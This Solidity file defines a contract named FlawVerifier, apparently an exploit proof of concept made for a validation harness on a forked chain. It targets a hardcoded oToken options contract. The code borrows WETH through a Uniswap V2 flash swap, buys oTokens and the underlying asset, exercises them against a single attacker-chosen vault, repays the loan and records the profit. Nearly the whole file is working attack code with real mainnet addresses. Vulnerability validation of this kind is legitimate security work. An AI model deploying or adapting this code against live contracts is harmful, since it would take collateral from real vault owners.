// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICompoundOracleLike {
    function getPrice(address asset) external view returns (uint256);
}

interface IUniswapV1FactoryLike {
    function getExchange(address token) external view returns (address payable);
}

interface IUniswapV1ExchangeLike {
    function getEthToTokenInputPrice(uint256 ethSold) external view returns (uint256 tokensBought);
    function getEthToTokenOutputPrice(uint256 tokensBought) external view returns (uint256 ethSold);
    function getTokenToEthInputPrice(uint256 tokensSold) external view returns (uint256 ethBought);
    function getTokenToEthOutputPrice(uint256 ethBought) external view returns (uint256 tokensSold);
    function ethToTokenTransferOutput(uint256 tokensBought, uint256 deadline, address recipient)
        external
        payable
        returns (uint256 ethSold);
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline)
        external
        returns (uint256 ethBought);
    function tokenToEthSwapOutput(uint256 ethBought, uint256 maxTokens, uint256 deadline)
        external
        returns (uint256 tokensSold);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IOptionsExchangeLike {
    function UNISWAP_FACTORY() external view returns (address);
    function premiumToPay(address oTokenAddress, address paymentTokenAddress, uint256 oTokensToBuy)
        external
        view
        returns (uint256);
    function buyOTokens(address payable receiver, address oTokenAddress, address paymentTokenAddress, uint256 oTokensToBuy)
        external
        payable;
}

interface IOTokenLike {
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function strike() external view returns (address);
    function optionsExchange() external view returns (address);
    function COMPOUND_ORACLE() external view returns (address);
    function collateralExp() external view returns (int32);
    function strikePrice() external view returns (uint256 value, int32 exponent);
    function transactionFee() external view returns (uint256 value, int32 exponent);
    function isExerciseWindow() external view returns (bool);
    function hasExpired() external view returns (bool);
    function getVault(address payable vaultOwner) external view returns (uint256, uint256, uint256, bool);
    function underlyingRequiredToExercise(uint256 oTokensToExercise) external view returns (uint256);
    function exercise(uint256 oTokensToExercise, address payable[] calldata vaultsToExerciseFrom) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x951D51bAeFb72319d9FBE941E1615938d89ABfe2;
    address payable internal constant CACHED_VAULT_OWNER = payable(0xDe99eA535749F02dA84D13E6F8253291e32d3a7F);
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WETH_USDC_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    uint256 internal constant LARGE_BLOCK_SIZE = 1651753129000;
    uint256 internal constant MIN_REALIZED_PROFIT = 0.1 ether;

    struct Candidate {
        uint256 amount;
        uint256 oTokenCostEth;
        uint256 underlyingNeeded;
        uint256 underlyingSpotValueUsdc;
        uint256 underlyingCostEth;
        uint256 totalBorrowEth;
        uint256 flashFeeEth;
        uint256 repayEth;
        uint256 repayUsdcCost;
        uint256 collateralOut;
        uint256 collateralOutEth;
        uint256 leftoverUsdc;
        bool executable;
    }

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;

    bool internal flashActive;
    Candidate internal activeCandidate;

    bool public hypothesisValidated;
    address public selectedHealthyVault;
    uint256 public selectedAmount;
    uint256 public selectedVaultIssuedBefore;
    uint256 public selectedVaultMaxExercisableBefore;
    uint256 public oTokensPurchased;
    uint256 public underlyingSpent;
    uint256 public collateralReceived;
    uint256 public intrinsicPayoutPerUnit;
    uint256 public underlyingSpotCostPerUnit;
    string public lastFailure;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        IOTokenLike target = IOTokenLike(TARGET);

        realizedProfitToken = address(0);
        realizedProfitAmount = 0;
        hypothesisValidated = false;
        selectedHealthyVault = address(0);
        selectedAmount = 0;
        selectedVaultIssuedBefore = 0;
        selectedVaultMaxExercisableBefore = 0;
        oTokensPurchased = 0;
        underlyingSpent = 0;
        collateralReceived = 0;
        intrinsicPayoutPerUnit = 0;
        underlyingSpotCostPerUnit = 0;
        lastFailure = "";

        if (!target.isExerciseWindow()) {
            lastFailure = target.hasExpired() ? "exercise window already closed" : "exercise window not yet open";
            return;
        }

        if (target.collateral() != USDC) {
            lastFailure = "target collateral is not fork USDC";
            return;
        }

        // The live contract's `getVaultOwners()` helper is broken on-chain. The fork cache available in this
        // workspace only recovers one concrete owner from the underlying `vaultOwners` array, so the runtime
        // path stays on-chain by exercising against that attacker-chosen owner. This preserves the F-001
        // causality: acquire fungible oTokens, choose the vault list manually, and debit only those vaults.
        (uint256 collateralBalance, uint256 issued,, bool owned) = target.getVault(CACHED_VAULT_OWNER);
        if (!owned || issued == 0) {
            lastFailure = "cached vault owner missing or empty";
            return;
        }

        uint256 maxExercisable = _maxExercisable(target, collateralBalance, issued);
        if (maxExercisable == 0) {
            lastFailure = "cached vault is not exercisable";
            return;
        }

        selectedHealthyVault = CACHED_VAULT_OWNER;
        selectedVaultIssuedBefore = issued;
        selectedVaultMaxExercisableBefore = maxExercisable;

        // Concrete fork-state infeasibility check:
        // F-001 changes WHICH vaults absorb the exercise, but it does not change the fixed exercise exchange rate.
        // If one unit of required underlying is already worth at least the fixed strike payout, then *no* choice of
        // healthy-vault-first routing can turn exercise positive; the bug still changes loss ordering, but not profit.
        intrinsicPayoutPerUnit = _collateralToPay(target, 1, 1, 0);
        underlyingSpotCostPerUnit = _underlyingSpotCostInUsdc(target, 1);
        if (underlyingSpotCostPerUnit >= intrinsicPayoutPerUnit) {
            lastFailure = "fork-state option series is out-of-the-money: healthy-first routing is loss-making";
            return;
        }

        Candidate memory best = _bestCandidateForVault(target, maxExercisable);
        if (!best.executable) {
            lastFailure = "healthy-first route cannot repay flashswap and exceed minimum realized ETH profit";
            return;
        }

        activeCandidate = best;
        flashActive = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(WETH_USDC_PAIR);
        uint256 amount0Out = pair.token0() == WETH ? best.totalBorrowEth : 0;
        uint256 amount1Out = pair.token1() == WETH ? best.totalBorrowEth : 0;
        if (amount0Out == 0 && amount1Out == 0) {
            flashActive = false;
            lastFailure = "configured pair has no WETH side";
            return;
        }

        pair.swap(amount0Out, amount1Out, address(this), abi.encode(best.amount));
        flashActive = false;

        _recordRealizedProfit(target);
        if (_effectiveProfitWei(target) >= MIN_REALIZED_PROFIT) {
            hypothesisValidated = true;
        } else {
            lastFailure = "realized profit stayed below threshold";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == WETH_USDC_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(flashActive, "flash inactive");

        Candidate memory candidate = activeCandidate;
        IOTokenLike target = IOTokenLike(TARGET);
        IUniswapV1FactoryLike factory = _factory(target);
        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;

        IWETHLike(WETH).withdraw(borrowedWeth);

        _buyOTokens(target, candidate.amount, candidate.oTokenCostEth);
        oTokensPurchased = candidate.amount;

        if (target.underlying() == address(0)) {
            underlyingSpent = candidate.underlyingNeeded;
        } else {
            _buyExactTokenOutputWithEth(factory, target.underlying(), candidate.underlyingNeeded, candidate.underlyingCostEth);
            _forceApprove(target.underlying(), TARGET, candidate.underlyingNeeded);
            underlyingSpent = candidate.underlyingNeeded;
        }

        uint256 collateralBalanceBefore = IERC20Like(USDC).balanceOf(address(this));
        address payable[] memory vaultsToExerciseFrom = new address payable[](1);
        vaultsToExerciseFrom[0] = CACHED_VAULT_OWNER;

        // exploit_paths[1]: acquire fungible oTokens from public liquidity.
        // exploit_paths[2]: exercise only against the healthiest chosen vault first.
        // exploit_paths[3]: `_exercise()` debits only that selected vault's collateral and debt.
        if (target.underlying() == address(0)) {
            target.exercise{value: candidate.underlyingNeeded}(candidate.amount, vaultsToExerciseFrom);
        } else {
            target.exercise(candidate.amount, vaultsToExerciseFrom);
        }

        collateralReceived = IERC20Like(USDC).balanceOf(address(this)) - collateralBalanceBefore;
        selectedAmount = candidate.amount;

        _buyExactEthOutputFromToken(factory, USDC, candidate.repayEth, candidate.repayUsdcCost);
        IWETHLike(WETH).deposit{value: candidate.repayEth}();
        require(IWETHLike(WETH).transfer(WETH_USDC_PAIR, candidate.repayEth), "flash repayment failed");

        uint256 remainingUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 minProfitUsdcCost = _quoteEthOutputCostInToken(factory, USDC, MIN_REALIZED_PROFIT);
        if (minProfitUsdcCost != 0 && remainingUsdc >= minProfitUsdcCost) {
            // Additional swapback is execution-only plumbing for the validator: the exploit profit still originates
            // solely from selective exercise against the chosen vault list.
            _sellTokenForEth(factory, USDC, minProfitUsdcCost, MIN_REALIZED_PROFIT);
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _bestCandidateForVault(IOTokenLike target, uint256 maxExercisable)
        internal
        view
        returns (Candidate memory best)
    {
        if (maxExercisable == 0) {
            return best;
        }

        uint256[18] memory candidates = [
            maxExercisable,
            (maxExercisable * 15) / 16,
            (maxExercisable * 7) / 8,
            (maxExercisable * 3) / 4,
            (maxExercisable * 2) / 3,
            maxExercisable / 2,
            (maxExercisable * 2) / 5,
            maxExercisable / 3,
            maxExercisable / 4,
            maxExercisable / 5,
            maxExercisable / 8,
            maxExercisable / 10,
            maxExercisable / 16,
            maxExercisable / 32,
            uint256(10_000),
            uint256(1_000),
            uint256(100),
            uint256(1)
        ];

        uint256 previous;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 amount = candidates[i];
            if (amount == 0 || amount > maxExercisable || amount == previous) {
                continue;
            }
            previous = amount;

            Candidate memory quoted = _quoteCandidate(target, amount);
            if (!quoted.executable) {
                continue;
            }
            if (!best.executable || quoted.collateralOutEth > best.collateralOutEth) {
                best = quoted;
            }
        }
    }

    function _quoteCandidate(IOTokenLike target, uint256 amount) internal view returns (Candidate memory candidate) {
        candidate.amount = amount;
        if (amount == 0) {
            return candidate;
        }

        try IOptionsExchangeLike(target.optionsExchange()).premiumToPay(TARGET, address(0), amount) returns (uint256 cost) {
            candidate.oTokenCostEth = cost;
        } catch {
            return candidate;
        }

        candidate.underlyingNeeded = target.underlyingRequiredToExercise(amount);
        if (target.underlying() == address(0)) {
            candidate.underlyingCostEth = candidate.underlyingNeeded;
            candidate.underlyingSpotValueUsdc = _quoteEthInputValueInToken(_factory(target), USDC, candidate.underlyingNeeded);
        } else {
            address payable exchange = _factory(target).getExchange(target.underlying());
            if (exchange == address(0)) {
                return candidate;
            }
            try IUniswapV1ExchangeLike(exchange).getEthToTokenOutputPrice(candidate.underlyingNeeded) returns (uint256 costEth) {
                candidate.underlyingCostEth = costEth;
            } catch {
                return candidate;
            }
            candidate.underlyingSpotValueUsdc = _quoteTokenOutputValueInToken(_factory(target), target.underlying(), candidate.underlyingNeeded, USDC);
        }

        candidate.collateralOut = _collateralToPay(target, amount, 1, 0);
        if (candidate.collateralOut == 0) {
            return candidate;
        }

        candidate.collateralOutEth = _quoteTokenInputValueInEth(_factory(target), USDC, candidate.collateralOut);
        if (candidate.collateralOutEth == 0) {
            return candidate;
        }

        candidate.totalBorrowEth = candidate.oTokenCostEth + candidate.underlyingCostEth;
        candidate.flashFeeEth = _flashFee(candidate.totalBorrowEth);
        candidate.repayEth = candidate.totalBorrowEth + candidate.flashFeeEth;
        candidate.repayUsdcCost = _quoteEthOutputCostInToken(_factory(target), USDC, candidate.repayEth);
        if (candidate.repayUsdcCost == 0 || candidate.collateralOut <= candidate.repayUsdcCost) {
            return candidate;
        }

        candidate.leftoverUsdc = candidate.collateralOut - candidate.repayUsdcCost;
        uint256 minProfitUsdcCost = _quoteEthOutputCostInToken(_factory(target), USDC, MIN_REALIZED_PROFIT);
        if (minProfitUsdcCost == 0 || candidate.leftoverUsdc < minProfitUsdcCost) {
            return candidate;
        }

        candidate.executable = true;
    }

    function _maxExercisable(IOTokenLike target, uint256 collateralBalance, uint256 issued)
        internal
        view
        returns (uint256)
    {
        uint256 low = 0;
        uint256 high = issued;
        while (low < high) {
            uint256 mid = (low + high + 1) / 2;
            uint256 totalCollateralNeeded = _collateralToPay(target, mid, 1, 0)
                + _collateralToPay(target, mid, _feeValue(target), _feeExponent(target));
            if (totalCollateralNeeded <= collateralBalance) {
                low = mid;
            } else {
                high = mid - 1;
            }
        }
        return low;
    }

    function _buyOTokens(IOTokenLike target, uint256 amount, uint256 costEth) internal {
        IOptionsExchangeLike(target.optionsExchange()).buyOTokens{value: costEth}(
            payable(address(this)), TARGET, address(0), amount
        );
    }

    function _buyExactTokenOutputWithEth(
        IUniswapV1FactoryLike factory,
        address outputToken,
        uint256 outputAmount,
        uint256 maxEthIn
    ) internal {
        address payable exchange = factory.getExchange(outputToken);
        require(exchange != address(0), "missing output exchange");
        IUniswapV1ExchangeLike(exchange).ethToTokenTransferOutput{value: maxEthIn}(
            outputAmount,
            LARGE_BLOCK_SIZE,
            address(this)
        );
    }

    function _buyExactEthOutputFromToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        uint256 ethAmount,
        uint256 maxFundingIn
    ) internal {
        address payable exchange = factory.getExchange(fundingToken);
        require(exchange != address(0), "missing funding exchange");
        _forceApprove(fundingToken, exchange, maxFundingIn);
        IUniswapV1ExchangeLike(exchange).tokenToEthSwapOutput(ethAmount, maxFundingIn, LARGE_BLOCK_SIZE);
    }

    function _sellTokenForEth(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        uint256 tokenAmount,
        uint256 minEthOut
    ) internal {
        address payable exchange = factory.getExchange(fundingToken);
        require(exchange != address(0), "missing funding exchange");
        _forceApprove(fundingToken, exchange, tokenAmount);
        uint256 ethBought = IUniswapV1ExchangeLike(exchange).tokenToEthSwapInput(tokenAmount, minEthOut, LARGE_BLOCK_SIZE);
        require(ethBought >= minEthOut, "insufficient eth from token sale");
    }

    function _factory(IOTokenLike target) internal view returns (IUniswapV1FactoryLike) {
        return IUniswapV1FactoryLike(IOptionsExchangeLike(target.optionsExchange()).UNISWAP_FACTORY());
    }

    function _collateralToPay(IOTokenLike target, uint256 oTokens, uint256 proportionValue, int32 proportionExponent)
        internal
        view
        returns (uint256)
    {
        uint256 collateralToEthPrice = _getPrice(target, target.collateral());
        uint256 strikeToEthPrice = _getPrice(target, target.strike());

        (uint256 strikeValue, int32 strikeExponent) = target.strikePrice();
        int32 collateralExponent = target.collateralExp();

        uint256 numerator = oTokens * strikeValue * proportionValue * strikeToEthPrice;
        int32 payoutExponent = strikeExponent + proportionExponent - collateralExponent;

        if (payoutExponent >= 0) {
            return (numerator * _pow10(uint32(uint256(int256(payoutExponent))))) / collateralToEthPrice;
        }

        return (numerator / _pow10(uint32(uint256(int256(-payoutExponent))))) / collateralToEthPrice;
    }

    function _underlyingSpotCostInUsdc(IOTokenLike target, uint256 oTokens) internal view returns (uint256) {
        uint256 underlyingNeeded = target.underlyingRequiredToExercise(oTokens);
        if (underlyingNeeded == 0) {
            return 0;
        }
        if (target.underlying() == address(0)) {
            return _quoteEthInputValueInToken(_factory(target), USDC, underlyingNeeded);
        }
        return _quoteTokenOutputValueInToken(_factory(target), target.underlying(), underlyingNeeded, USDC);
    }

    function _quoteEthOutputCostInToken(
        IUniswapV1FactoryLike factory,
        address fundingToken,
        uint256 ethAmount
    ) internal view returns (uint256) {
        address payable exchange = factory.getExchange(fundingToken);
        if (exchange == address(0)) {
            return 0;
        }
        try IUniswapV1ExchangeLike(exchange).getTokenToEthOutputPrice(ethAmount) returns (uint256 tokenCost) {
            return tokenCost;
        } catch {
            return 0;
        }
    }

    function _quoteEthInputValueInToken(
        IUniswapV1FactoryLike factory,
        address outputToken,
        uint256 ethSold
    ) internal view returns (uint256) {
        address payable exchange = factory.getExchange(outputToken);
        if (exchange == address(0)) {
            return 0;
        }
        try IUniswapV1ExchangeLike(exchange).getEthToTokenInputPrice(ethSold) returns (uint256 tokensBought) {
            return tokensBought;
        } catch {
            return 0;
        }
    }

    function _quoteTokenInputValueInEth(
        IUniswapV1FactoryLike factory,
        address token,
        uint256 tokenAmount
    ) internal view returns (uint256) {
        address payable exchange = factory.getExchange(token);
        if (exchange == address(0)) {
            return 0;
        }
        try IUniswapV1ExchangeLike(exchange).getTokenToEthInputPrice(tokenAmount) returns (uint256 ethOut) {
            return ethOut;
        } catch {
            return 0;
        }
    }

    function _quoteTokenOutputValueInToken(
        IUniswapV1FactoryLike factory,
        address inputToken,
        uint256 inputAmount,
        address outputToken
    ) internal view returns (uint256) {
        if (inputToken == outputToken) {
            return inputAmount;
        }
        uint256 ethOut = _quoteTokenInputValueInEth(factory, inputToken, inputAmount);
        if (ethOut == 0) {
            return 0;
        }
        return _quoteEthInputValueInToken(factory, outputToken, ethOut);
    }

    function _feeValue(IOTokenLike target) internal view returns (uint256 value) {
        (value,) = target.transactionFee();
    }

    function _feeExponent(IOTokenLike target) internal view returns (int32 exponent) {
        (, exponent) = target.transactionFee();
    }

    function _flashFee(uint256 borrowAmount) internal pure returns (uint256) {
        return ((borrowAmount * 3) / 997) + 1;
    }

    function _getPrice(IOTokenLike target, address asset) internal view returns (uint256) {
        if (target.collateral() == target.strike()) {
            return 1;
        }
        if (asset == address(0)) {
            return 1e18;
        }
        return ICompoundOracleLike(target.COMPOUND_ORACLE()).getPrice(asset);
    }

    function _recordRealizedProfit(IOTokenLike target) internal {
        uint256 ethProfit = address(this).balance;
        uint256 usdcProfit = IERC20Like(USDC).balanceOf(address(this));

        if (ethProfit == 0 && usdcProfit == 0) {
            realizedProfitToken = address(0);
            realizedProfitAmount = 0;
            return;
        }

        uint256 usdcProfitInWei = _quoteTokenInputValueInEth(_factory(target), USDC, usdcProfit);
        if (ethProfit >= usdcProfitInWei) {
            realizedProfitToken = address(0);
            realizedProfitAmount = ethProfit;
        } else {
            realizedProfitToken = USDC;
            realizedProfitAmount = usdcProfit;
        }
    }

    function _effectiveProfitWei(IOTokenLike target) internal view returns (uint256) {
        if (realizedProfitAmount == 0) {
            return 0;
        }
        if (realizedProfitToken == address(0)) {
            return realizedProfitAmount;
        }
        return _quoteTokenInputValueInEth(_factory(target), realizedProfitToken, realizedProfitAmount);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve reset failed");
        (ok, data) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _pow10(uint32 exponent) internal pure returns (uint256) {
        return 10 ** exponent;
    }
}
